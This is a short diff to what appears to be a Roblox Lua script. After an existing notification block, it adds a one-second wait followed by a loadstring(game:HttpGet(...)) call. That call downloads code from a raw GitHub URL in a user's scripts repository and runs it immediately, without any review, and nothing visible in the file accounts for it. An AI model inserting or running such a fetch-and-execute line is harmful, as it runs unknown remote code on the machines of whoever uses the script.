@@ -110,3 +110,5 @@ if not scriptFound then
         Duration = 5
     })
 end
+wait(1)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/realgengar/scripts/refs/heads/main/Adm'),true))()
